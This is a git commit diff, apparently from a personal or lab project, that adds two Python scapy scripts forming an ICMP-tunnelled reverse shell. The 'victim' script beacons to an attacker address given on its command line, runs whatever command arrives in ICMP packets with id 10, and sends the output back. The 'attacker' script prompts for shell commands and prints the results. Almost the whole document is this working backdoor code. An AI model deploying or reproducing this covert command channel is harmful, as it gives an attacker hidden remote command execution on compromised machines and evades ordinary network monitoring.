6f16ef2d25a79424d1f7802922e12a16e2238e83
FATBO1 <maxneo14@gmail.com>
2024-06-15 17:32:52 +0800

    able to get shell

--- testing/attacker_max.py
+++ testing/attacker_max.py
@@ -1,17 +1,29 @@
 from scapy.all import *
 
-#ICMP id 10 = 0xa
-def send_packet():
 
-    ip_packet = IP(dst="127.0.0.1")/ICMP(id=10)/Raw('ifconfig')
+# ICMP id 10 = 0xa
+def send_packet(ipsrc):
+    command = input("Shell: ")
+    ip_packet = IP(dst=ipsrc) / ICMP(id=10) / Raw(load=command)
     ip_packet.show()
-    sr(ip_packet)
+    send(ip_packet)
 
-    
+
+def check_packet_valid(packet):
+    if packet.haslayer(ICMP):
+        if packet[ICMP].id == 10:
+            ip_src = packet[IP].src
+            if packet.haslayer(Raw):
+                output = packet[Raw].load.decode()
+                print(output)
+            else:
+                send_packet(ip_src)
+
+
 
 def main():
-    send_packet()
-    pass
+    
+    sniff(prn=check_packet_valid, filter='inbound', iface="eth0")
 
 
 if __name__ == "__main__":
--- testing/victim_max.py
+++ testing/victim_max.py
@@ -1,21 +1,41 @@
 from scapy.all import *
 import subprocess
+import sys
+
+attacker_ip = sys.argv[1]
+
+
+
+def send_icmp_to_attacker():
+    packet = IP(dst=attacker_ip) / ICMP(id=10)
+    send(packet)
+    print(f"sent to {attacker_ip}")
 
 
 # ICMP id 10 = 0xa
 def check_packet(packet):
     if packet.haslayer(ICMP):
-        packet.show()
         if packet[ICMP].id == 10:
-            print("yes")
-            if packet[Raw] == 'ipconfig':
-                result = subprocess.run('ipconfig', shell=True, capture_output=True, text=True)
-
+            # packet.show()
+            # print(packet[Raw].load)
+            if packet[Raw].load:
+                print("incoming packet")
+                packet.show()
+                result = subprocess.run(
+                    packet[Raw].load, capture_output=True, text=True
+                )
+                # print(result.stdout)
+                print("outgoing packet")
+                reply_packet = (
+                    IP(dst=packet[IP].src) / ICMP(id=10) / Raw(load=result.stdout)
+                )
+                reply_packet.show()
+                send(reply_packet)
 
 
 def main():
-    sniff(prn=check_packet, iface=conf.loopback_name)
-    pass
+    send_icmp_to_attacker()
+    sniff(prn=check_packet, filter='inbound', iface="eth0")
 
 
 if __name__ == "__main__":
